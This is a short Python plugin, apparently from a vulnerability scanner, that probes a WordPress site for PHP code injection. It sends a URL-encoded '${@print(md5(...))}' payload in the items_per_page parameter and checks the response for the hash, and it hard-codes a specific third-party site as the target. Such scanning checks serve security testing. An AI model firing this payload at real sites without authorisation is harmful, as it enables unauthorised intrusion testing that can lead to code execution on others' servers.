#!/usr/bin/env python

def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
    payload = 'produits/?items_per_page=%24%7b%40print(md5(balabala))%7d&setListingType=grid'
    verify_url = arg + payload
    code, head, res, errcode, _ = curl.curl2(verify_url)
    if code == 200 and '4fd952b7a28daf93be5457b4318554a1' in res:
        security_hole(verify_url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://www.abl-dz.com/')[1])